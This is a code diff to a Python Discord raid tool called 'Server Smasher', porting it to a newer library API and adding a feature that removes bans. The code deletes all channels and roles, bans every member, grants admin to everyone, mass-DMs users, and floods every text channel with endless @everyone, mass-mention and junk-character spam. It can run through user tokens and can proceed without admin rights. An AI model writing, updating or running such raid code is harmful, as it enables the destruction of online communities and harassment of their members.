@@ -4,6 +4,7 @@ try:
     import json
     import time
     import random
+    import ctypes
     import asyncio
     import discord
     import requests
@@ -20,6 +21,13 @@ except Exception as e:
     input()
     sys.exit()
 
+smversion = sys.argv[1]
+menucolour = sys.argv[2]
+
+if sys.platform.startswith('win32'):
+    ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Server Smasher v{}".format(smversion))
+elif sys.platform.startswith('linux'):
+    sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Server Smasher v{}\x07".format(smversion))
 class Worker(Thread):
     """
     Pooling
@@ -92,6 +100,16 @@ def deletechannel(channel):
     if "You are being rate limited." in str(src.content):
         time.sleep(1)
         deletechannel(channel)
+
+def removeban(server,user):
+    if clienttype == 'bot':
+        headers={ 'Authorization': 'Bot '+token}
+    else:
+        headers={ 'Authorization': token}
+    src = requests.delete("https://discordapp.com/api/v6/guilds/"+str(server)+"/bans/"+str(user), headers=headers)
+    if "You are being rate limited." in str(src.content):
+        time.sleep(1)
+        removeban(server,user)
 
 def deleterole(role,server):
     if clienttype == 'bot':
@@ -170,36 +188,40 @@ def complete_pool():
 @client.event
 async def on_ready():
     if changegameonlogin == True:
-        await client.change_presence(game=discord.Game(name=logingame))
+        await client.change_presence(activity=discord.Game(name=logingame))
     clear()
     print (colored("Login success!","green"))
     await serverselect()
 
 async def serverselect():
+    if sys.platform.startswith('win32'):
+        os.system('mode con:cols=70 lines=30')
     lists = []
     clear()
     if clienttype == "bot":
         usert = "Bot"
     else:
         usert = "User"
-    print("Logged in as {}".format(client.user.name+"#"+client.user.discriminator))
-    print("{} is in the following channels: \n".format(usert))
+    print (colored("Logged in as {}".format(client.user.name+"#"+client.user.discriminator,menucolour)))
+    print (colored("{} is in the following channels: \n".format(usert),menucolour))
     counter = -1
-    for serv in client.servers:
+    for serv in client.guilds:
         membcount = 0
         for member in serv.members:
             membcount += 1
         counter += 1
-        print(colored(str(counter)+'. ('+str(serv.id)+') '+str(serv)+" ({} members)".format(membcount)+'\n',"green"))
+        print(colored(str(counter)+'. ('+str(serv.id)+') '+str(serv)+" ({} members)".format(membcount),menucolour))
         lists.append(serv.id)
     print('----------------------------------------')
     servernum = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Select the server to configure bot actions: ')
     if servernum.lower() == 'back':
         print ("Returning to Raid ToolBox.")
         await client.close()
+        await asyncio.sleep(2)
     elif servernum.lower() == 'b':
         print ("Returning to Raid ToolBox.")
         await client.close()
+        await asyncio.sleep(2)
     else:
         try:
             SERVER = lists[int(servernum)]
@@ -208,14 +230,16 @@ async def serverselect():
     await main(SERVER)
 
 async def main(SERVER):
+    if sys.platform.startswith('win32'):
+        os.system('mode con:cols=70 lines=30')
     #options
     clear()
-    server = client.get_server(SERVER)
+    server = client.get_guild(int(SERVER))
     print ("Server: " + server.name)
     print ("Server ID: " + str(SERVER))
     print ("----------------------------------------")
     print ("Options:")
-    print (colored(" 0. Return to server select. \n 1. Configure then destroy. \n 2. Destroy with config settings.  \n 3. Create Server Invite. \n 4. Change What the bot is playing. \n 5. Leave server. \n 6. Return to Raid ToolBox Menu","green"))
+    print (colored(" 0. Return to server select. \n 1. Configure then destroy. \n 2. Create Server Invite. \n 3. Change What the bot is playing. \n 4. Leave server. \n 5. Return to Raid ToolBox Menu",menucolour))
     opts = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Select the number for your option: ")
     toggleopts = {
         'namechange' : namechange,
@@ -223,6 +247,7 @@ async def main(SERVER):
         'iconbegone' : iconbegone,
         'changeicon' : changeicon,
         'iconfile' : iconfile,
+        'rembans' : rembans,
         'chandel' : chandel,
         'roledel' : roledel,
         'userban' : userban,
@@ -248,51 +273,55 @@ async def main(SERVER):
 
         elif int(opts) == 1:
             async def changesettings(toggleopts,SERVER):
+                if sys.platform.startswith('win32'):
+                    os.system('mode con:cols=70 lines=30')
                 try:
                     clear()
-                    server = client.get_server(SERVER)
-                    print (colored("Type 'start' to start the smashing","green"))
-                    print (colored("0.  Go back","green"))
-                    print (colored("1.  Change server name: {}".format(toggleopts['namechange']),"green"))
-                    print (colored("2.  New Server Name: {}".format(toggleopts['servname']),"green"))
-                    print (colored("3.  Remove server icon: {}".format(toggleopts['iconbegone']),"green"))
-                    print (colored("4.  Change server icon: {}".format(toggleopts['changeicon']),"green"))
-                    print (colored("5.  Icon Filename: {}".format(toggleopts['iconfile']),"green"))
-                    print (colored("6.  Delete all channels: {}".format(toggleopts['chandel']),"green"))
-                    print (colored("7.  Delete all roles: {}".format(toggleopts['roledel']),"green"))
-                    print (colored("8.  Ban all members: {}".format(toggleopts['userban']),"green"))
-                    print (colored("9.  Ban Reason: {}".format(toggleopts['banreason']),"green"))
-                    print (colored("10. Users to not Ban: {}".format(toggleopts['userid']),"green"))
-                    print (colored("11. Send DM to everyone: {}".format(toggleopts['senddm']),"green"))
-                    print (colored("12. DM Content: {}".format(toggleopts['dmcontent']),"green"))
-                    print (colored("13. Create Channels: {}".format(toggleopts['createchan']),"green"))
-                    print (colored("14. Channel Creation type: {}".format(toggleopts['chanmethod']),"green"))
-                    print (colored("15. Name for the created channels: {}".format(toggleopts['channame']),"green"))
-                    print (colored("16. Number of channels to create: {}".format(toggleopts['channelno']),"green"))
-                    print (colored("17. Spam after destruction: {}".format(toggleopts['usespam']),"green"))
-                    print (colored("18. Spamming method: {}".format(toggleopts['spammethod']),"green"))
-                    print (colored("19. Text to spam: {}".format(toggleopts['customtxt']),"green"))
-                    print (colored("20. Use text to speech in message: {}".format(toggleopts['usetts']),"green"))
-                    print (colored("21. Give yourself admin: {}".format(toggleopts['gimmieadmin']),"green"))
-                    print (colored("22. Your ID: {}".format(toggleopts['me']),"green"))
-                    print (colored("23. Give @everyone admin: {}".format(toggleopts['giveeveryoneadmin']),"green"))
+                    server = client.get_guild(int(SERVER))
+                    print (colored("Type 'start' to start.",menucolour))
+                    print (colored("0.  Go back",menucolour))
+                    print (colored("1.  Change server name: {}".format(toggleopts['namechange']),menucolour))
+                    print (colored("2.  New Server Name: {}".format(toggleopts['servname']),menucolour))
+                    print (colored("3.  Remove server icon: {}".format(toggleopts['iconbegone']),menucolour))
+                    print (colored("4.  Change server icon: {}".format(toggleopts['changeicon']),menucolour))
+                    print (colored("5.  Icon Filename: {}".format(toggleopts['iconfile']),menucolour))
+                    print (colored("6.  Remove Bans: {}".format(toggleopts['rembans']),menucolour))
+                    print (colored("7.  Delete all channels: {}".format(toggleopts['chandel']),menucolour))
+                    print (colored("8.  Delete all roles: {}".format(toggleopts['roledel']),menucolour))
+                    print (colored("9.  Ban all members: {}".format(toggleopts['userban']),menucolour))
+                    print (colored("10. Ban Reason: {}".format(toggleopts['banreason']),menucolour))
+                    print (colored("11. Users to not Ban: {}".format(toggleopts['userid']),menucolour))
+                    print (colored("12. Send DM to everyone: {}".format(toggleopts['senddm']),menucolour))
+                    print (colored("13. DM Content: {}".format(toggleopts['dmcontent']),menucolour))
+                    print (colored("14. Create Channels: {}".format(toggleopts['createchan']),menucolour))
+                    print (colored("15. Channel Creation type: {}".format(toggleopts['chanmethod']),menucolour))
+                    print (colored("16. Name for the created channels: {}".format(toggleopts['channame']),menucolour))
+                    print (colored("17. Number of channels to create: {}".format(toggleopts['channelno']),menucolour))
+                    print (colored("18. Spam after destruction: {}".format(toggleopts['usespam']),menucolour))
+                    print (colored("19. Spamming method: {}".format(toggleopts['spammethod']),menucolour))
+                    print (colored("20. Text to spam: {}".format(toggleopts['customtxt']),menucolour))
+                    print (colored("21. Use text to speech in message: {}".format(toggleopts['usetts']),menucolour))
+                    print (colored("22. Give yourself admin: {}".format(toggleopts['gimmieadmin']),menucolour))
+                    print (colored("23. Your ID: {}".format(toggleopts['me']),menucolour))
+                    print (colored("24. Give @everyone admin: {}".format(toggleopts['giveeveryoneadmin']),menucolour))
                     toga = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Item to toggle or change:\n")
                     if toga.lower() == "start":
-                        channellist = []
-                        sc = 0
-                        for c in server.channels:
-                            myperms = c.permissions_for(server.get_member(client.user.id))
+                        for channel in server.channels:
+                            myperms = channel.permissions_for(server.get_member(client.user.id))
                             if myperms.administrator:
-                                channellist.append(c)
+                                pass
                             else:
                                 print (colored("You do not have the permissions to destroy this server.","red"))
-                                input ()
-                                await main(SERVER)
+                                con = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Continue anyway?(Y/N)")
+                                if con.lower() == 'y':
+                                    pass
+                                else:
+                                    await main(SERVER)
                         if toggleopts['chandel'] == True:
                             print('Deleting channels.')
                             for channel in server.channels:
                                 print (colored("Deleting " + str(channel.name),"blue"))
-                                pool.add_task(deletechannel,channel.id)
+                                pool.add_task(deletechannel,str(channel.id))
                             await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                             print('Finished deleting channels.')
 
@@ -300,9 +329,20 @@ async def main(SERVER):
                            print ('Deleting Roles.')
                            for role in server.roles:
                                 print (colored("Deleting role: " + role.name,"blue"))
-                                pool.add_task(deleterole,role.id,SERVER)
+                                pool.add_task(deleterole,str(role.id),SERVER)
                            pool.wait_completion()
                            print('Finished deleting roles.')
+
+                        if toggleopts['rembans'] == True:
+                            print ("Removing bans.")
+                            bans = await server.bans()
+                            print (bans)
+                            for ban in bans:
+                                for user in ban:
+                                    try:
+                                        pool.add_task(removeban,str(server.id),str(user.id))
+                                    except Exception:
+                                        pass
 
                         if toggleopts['senddm'] == True:
                             for user in server.members:
@@ -312,7 +352,7 @@ async def main(SERVER):
 
                         if toggleopts['namechange'] == True:
                             print('Changing server name...')
-                            await client.edit_server(server=server, name=str(toggleopts['servname']))
+                            await server.edit(name=str(toggleopts['servname']))
 
                         if toggleopts['iconbegone'] == True:
                             print('Removing icon...')
@@ -326,30 +366,30 @@ async def main(SERVER):
                                 icofile = "spammer/serversmasher/" + toggleopts['iconfile']
                             with open(icofile, 'rb') as handle:
                                 icon = handle.read()
-                                await client.edit_server(server, icon=icon)
+                                await server.edit(icon=icon)
 
                         if toggleopts['giveeveryoneadmin'] == True:
                             print('Giving everyone admin...')
                             for role in server.roles:
                                 if role.name == '@everyone':
-                                    await client.edit_role(server=server, role=role,permissions=Permissions.all())
+                                    await role.edit(permissions=Permissions.all())
                                     break
 
                         if toggleopts['userban'] == True:
                             print('Banning users...')
                             for user in server.members:
-                                if toggleopts['userid'] in user.name:
+                                if str(user.name+"#"+user.discriminator) in toggleopts['userid']:
                                     print (colored("Not Banning " + str(user.name),"green"))
                                 else:
                                     print (colored('Banning ' + str(user.name),"blue"))
-                                    pool.add_task(banuser,user.id,SERVER)
+                                    pool.add_task(banuser,str(user.id),SERVER)
                             await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
 
                         if toggleopts['gimmieadmin'] == True:
                             print('Giving you admin...')
-                            role = await client.create_role(server, name="Admin", permissions=Permissions.all())
-                            user = server.get_member(toggleopts['me'])
-                            await client.add_roles(user, role)
+                            role = await server.create_role(name="Admin", permissions=Permissions.all())
+                            user = server.get_member(int(toggleopts['me']))
+                            await user.add_roles(role)
 
                         if toggleopts['createchan'] == True:
                             print('Creating channels.')
@@ -372,7 +412,7 @@ async def main(SERVER):
                         if toggleopts['chanmethod'].lower() == "voice":
                             if toggleopts['chandel'] == True:
                                 print (colored("Not spamming, due to there only being voice channels in this server.","red"))
-                                input ()
+                                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"")
                                 await main(SERVER)
 
                         if toggleopts['usespam'] == True:
@@ -387,7 +427,7 @@ async def main(SERVER):
                                 await everyonespam(SERVER,toggleopts['usetts'])
                         else:
                             print ("Finished!")
-                            input()
+                            await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"")
                             await main(SERVER)
                     if int(toga) == 0:
                         await main(SERVER)
@@ -416,82 +456,88 @@ async def main(SERVER):
                         toggleopts['iconfile'] = input ("Name of the icon: ")
                         await changesettings(toggleopts,SERVER)
                     elif int(toga) == 6:
+                        if toggleopts['rembans'] == True:
+                            toggleopts['rembans'] = False
+                        else:
+                            toggleopts['rembans'] = True
+                        await changesettings(toggleopts,SERVER)
+                    elif int(toga) == 7:
                         if toggleopts['chandel'] == True:
                             toggleopts['chandel'] = False
                         else:
                             toggleopts['chandel'] = True
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 7:
+                    elif int(toga) == 8:
                         if toggleopts['roledel'] == True:
                             toggleopts['roledel'] = False
                         else:
                             toggleopts['roledel'] = True
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 8:
+                    elif int(toga) == 9:
                         if toggleopts['userban'] == True:
                             toggleopts['userban'] = False
                         else:
                             toggleopts['userban'] = True
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 9:
+                    elif int(toga) == 10:
                         toggleopts['banreason'] = input ("Ban Reason: ")
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 10:
+                    elif int(toga) == 11:
                         appen = input ("Username and Descriminator: ")
                         toggleopts['userid'].append(appen)
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 11:
+                    elif int(toga) == 12:
                         if toggleopts['senddm'] == True:
                             toggleopts['senddm'] = False
                         else:
                             toggleopts['senddm'] = True
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 12:
+                    elif int(toga) == 13:
                         toggleopts['dmcontent']  = input ("DM Content: ")
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 13:
+                    elif int(toga) == 14:
                         if toggleopts['createchan'] == True:
                             toggleopts['createchan'] = False
                         else:
                             toggleopts['createchan'] = True
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 14:
+                    elif int(toga) == 15:
                         toggleopts['chanmethod']  = input ("Channel Creation method (set,ascii,voice): ")
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 15:
+                    elif int(toga) == 16:
                         toggleopts['channame']  = input ("Name of created channels: ")
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 16:
+                    elif int(toga) == 17:
                         toggleopts['channelno'] = input ("Number of Channels to create: ")
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 17:
+                    elif int(toga) == 18:
                         if toggleopts['usespam'] == True:
                             toggleopts['usespam'] = False
                         else:
                             toggleopts['usespam'] = True
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 18:
+                    elif int(toga) == 19:
                         toggleopts['spammethod']  = input ("Spamming method (text,asc,everyone): ")
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 19:
+                    elif int(toga) == 20:
                         toggleopts['customtxt']  = input ("Text to spam: ")
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 20:
+                    elif int(toga) == 21:
                         if toggleopts['usetts'] == 'true':
                             toggleopts['usetts'] = 'false'
                         else:
                             toggleopts['usetts'] = 'true'
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 21:
+                    elif int(toga) == 22:
                         if toggleopts['gimmieadmin'] == True:
                             toggleopts['gimmieadmin'] = False
                         else:
                             toggleopts['gimmieadmin'] = True
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 22:
+                    elif int(toga) == 23:
                         toggleopts['me']  = input ("Your ID for giving admin: ")
                         await changesettings(toggleopts,SERVER)
-                    elif int(toga) == 23:
+                    elif int(toga) == 24:
                         if toggleopts['giveeveryoneadmin'] == True:
                             toggleopts['giveeveryoneadmin'] = False
                         else:
@@ -499,153 +545,44 @@ async def main(SERVER):
                         await changesettings(toggleopts,SERVER)
                 except Exception as e:
                     print (e)
-                    input()
+                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
             await changesettings(toggleopts,SERVER)
 
         elif int(opts) == 2:
-            #actions
-            for c in server.channels:
-                myperms = c.permissions_for(server.get_member(client.user.id))
-                if myperms.administrator:
-                    channellist.append(c)
-                else:
-                    print (colored("You do not have the permissions to destroy this server.","red"))
-                    input ()
-                    await main(SERVER)
-            if chandel == True:
-                print('Deleting channels.')
-                for channel in server.channels:
-                    print (colored("Deleting " + str(channel.name),"blue"))
-                    pool.add_task(deletechannel,channel.id)
-                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-                print('Finished deleting channels.')
-
-            if roledel == True:
-               print ('Deleting Roles.')
-               for role in server.roles:
-                    print (colored("Deleting role: " + role.name,"blue"))
-                    pool.add_task(deleterole,role.id,SERVER)
-               await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-               print('Finished deleting roles.')
-
-            if senddm == True:
-                for user in server.members:
-                    print (colored('Sending DM to ' + user.name,"blue"))
-                    pool.add_task(senddmtouser,user.id,dmcontent)
-                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-            if namechange == True:
-                print('Changing server name...')
-                await client.edit_server(server=server, name=str(servname))
-
-            if iconbegone == True:
-                print('Removing icon...')
-                await client.edit_server(server=server, icon=None)
-
-            if changeicon == True:
-                print('Changing icon...')
-                if sys.platform.startswith('win32'):
-                    icofile = ".\\spammer\\serversmasher\\" + iconfile
-                elif sys.platform.startswith('linux'):
-                    icofile = "spammer/serversmasher/" + iconfile
-                with open(icofile, 'rb') as handle:
-                    icon = handle.read()
-                    await client.edit_server(server, icon=icon)
-
-            if giveeveryoneadmin == True:
-                print('Giving everyone admin...')
-                for role in server.roles:
-                    if role.name == '@everyone':
-                        await client.edit_role(server=server, role=role,permissions=Permissions.all())
-
-            if userban == True:
-                print('Banning users...')
-                for user in server.members:
-                    if str(user) in userid:
-                        print (colored("Not Banning " + str(user.name),"green"))
-                    else:
-                        print (colored('Banning ' + str(user.name),"blue"))
-                        pool.add_task(banuser,user.id,SERVER)
-                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-
-            if gimmieadmin == True:
-                print('Giving you admin...')
-                role = await client.create_role(server, name="Admin", permissions=Permissions.all())
-                user = server.get_member(me)
-                await client.add_roles(user, role)
-
-            if createchan == True:
-                print('Creating channels.')
-                for x in range(int(channelno)):
-                    if chanmethod.lower() == "ascii":
-                        asc = ""
-                        for x in range(60):
-                            num = random.randrange(13000)
-                            asc = asc + chr(num)
-                        pool.add_task(createchannel,SERVER,asc,"text")
-                    if chanmethod.lower() == "set":
-                        pool.add_task(createchannel,SERVER,channame,"text")
-
-                    if chanmethod.lower() == "voice":
-                        pool.add_task(createchannel,SERVER,channame,"voice")
-                await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
-
-                print ('Channels Created.')
-
-            if chanmethod.lower() == "voice":
-                if chandel == True:
-                    print (colored("Not spamming, due to there only being voice channels in this server.","red"))
-                    await loop.run_in_executor(ThreadPoolExecutor(), input())
-                    await main(SERVER)
-
-            if usespam == True:
-                print('Spam will start in 5 seconds.')
-                if spammethod == "asc":
-                    await ascii_spam(SERVER,usetts)
-                if spammethod == "massment":
-                    await mass_tag(SERVER,usetts)
-                if spammethod == "text":
-                    await text_spam(SERVER,customtxt,usetts)
-                if spammethod == "everyone":
-                    await everyonespam(SERVER,usetts)
-            else:
-                print ("Finished!")
+            for channel in server.text_channels:
+                invitelink = await channel.create_invite()
+                invite = invitelink.url
+                pyperclip.copy(invite)
+                print (invite + " copied to clipboard.")
                 await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                 await main(SERVER)
-
-        elif int(opts) == 3:
-            for channel in server.channels:
-                if channel.type == discord.ChannelType.text:
-                    invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
-                    invite = invitelinknew.url
-                    pyperclip.copy(invite)
-                    print (invite + " copied to clipboard.")
-                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
-                    await main(SERVER)
-
-                elif channel.type == discord.ChannelType.voice:
-                    invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
-                    invite = invitelinknew.url
-                    pyperclip.copy(invite)
-                    print (invite + " copied to clipboard.")
-                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
-                    await main(SERVER)
-
-        elif int(opts) == 4:
-            play = input ("Playing ")
-            await client.change_presence(game=discord.Game(name=play))
+            for channel in server.voice_channels:
+                invitelink = await channel.create_invite()
+                invite = invitelink.url
+                pyperclip.copy(invite)
+                print (invite + " copied to clipboard.")
+                await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
+                await main(SERVER)
+            print ("Unable to create invite.")
+            await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
             await main(SERVER)
 
-        elif int(opts) == 5:
+        elif int(opts) == 3:
+            play = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Playing ')
+            await client.change_presence(activity=discord.Game(name=play))
+            await main(SERVER)
+
+        elif int(opts) == 4:
             print ("Are you sure you want to leave this server? (Y/N): ")
             yn = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
             if yn.lower() == 'y':
-                await client.leave_server(server)
+                await server.leave()
                 await asyncio.sleep(3)
                 await serverselect()
             else:
                 await main(SERVER)
 
-        elif int(opts) == 6:
+        elif int(opts) == 5:
             print ("Returning to Raid ToolBox.")
             await client.close()
 
@@ -656,73 +593,61 @@ async def main(SERVER):
         await main(SERVER)
 
 async def mass_tag(SERVER,usetts):
-    server = client.get_server(SERVER)
     await asyncio.sleep(5)
-    await client.wait_until_ready()
-    msg = ' '
-    for m in server.members:
-        msg += m.mention + ' '
-    while not client.is_closed:
-       for c in server.channels:
-            if c.type != discord.ChannelType.text:
-               continue
-            myperms = c.permissions_for(server.get_member(client.user.id))
+    server = client.get_guild(int(SERVER))
+    msg = ''
+    for member in server.members:
+        msg += member.mention + ' '
+    while not client.is_closed():
+        for channel in server.text_channels:
+            myperms = channel.permissions_for(server.get_member(client.user.id))
             if not myperms.send_messages:
                 continue
-            print('Mass Mentioning in: '+c.name)
+            print('Mass Mentioning in: '+channel.name)
             for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
-                pool.add_task(sendspam,c.id,m,usetts)
-       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
+                pool.add_task(sendspam,str(channel.id),m,usetts)
 
 async def ascii_spam(SERVER,usetts):
-    server = client.get_server(SERVER)
     await asyncio.sleep(5)
+    server = client.get_guild(int(SERVER))
     await client.wait_until_ready()
-    while not client.is_closed:
-       for c in server.channels:
-            if c.type != discord.ChannelType.text:
-               continue
-            myperms = c.permissions_for(server.get_member(client.user.id))
+    while not client.is_closed():
+        for channel in server.text_channels:
+            myperms = channel.permissions_for(server.get_member(client.user.id))
             if not myperms.send_messages:
                 continue
-            print('Ascii Spamming in: '+c.name)
+            print('Ascii Spamming in: '+channel.name)
             asc = ""
             for x in range(1999):
                 num = random.randrange(13000)
                 asc = asc + chr(num)
-            pool.add_task(sendspam,c.id,asc,usetts)
-       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
+            pool.add_task(sendspam,str(channelid),asc,usetts)
 
 async def text_spam(SERVER,customtxt,usetts):
-    server = client.get_server(SERVER)
     await asyncio.sleep(5)
+    server = client.get_guild(int(SERVER))
     await client.wait_until_ready()
-    while not client.is_closed:
-       for c in server.channels:
-            if c.type != discord.ChannelType.text:
-               continue
-            myperms = c.permissions_for(server.get_member(client.user.id))
+    while not client.is_closed():
+        for channel in server.text_channels:
+            myperms = channel.permissions_for(server.get_member(client.user.id))
             if not myperms.send_messages:
                 continue
-            print('Text Spamming in: '+c.name)
-            pool.add_task(sendspam,c.id,customtxt,usetts)
-       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
+            print('Text Spamming in: '+channel.name)
+            pool.add_task(sendspam,str(channel.id),customtxt,usetts)
+
 
 async def everyonespam(SERVER,usetts):
-    server = client.get_server(SERVER)
     await asyncio.sleep(5)
+    server = client.get_guild(int(SERVER))
     await client.wait_until_ready()
-    while not client.is_closed:
-       for c in server.channels:
-            if c.type != discord.ChannelType.text:
-               continue
-            myperms = c.permissions_for(server.get_member(client.user.id))
+    while not client.is_closed():
+        for channel in server.text_channels:
+            myperms = channel.permissions_for(server.get_member(client.user.id))
             if not myperms.send_messages:
                 continue
             message = "@everyone"
-            print('@everyone Spamming in: '+c.name)
-            pool.add_task(sendspam,c.id,message,usetts)
-       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
+            print('@everyone Spamming in: '+channel.name)
+            pool.add_task(sendspam,str(channel.id),message,usetts)
 
 if clienttype.lower() == "user":
     try:
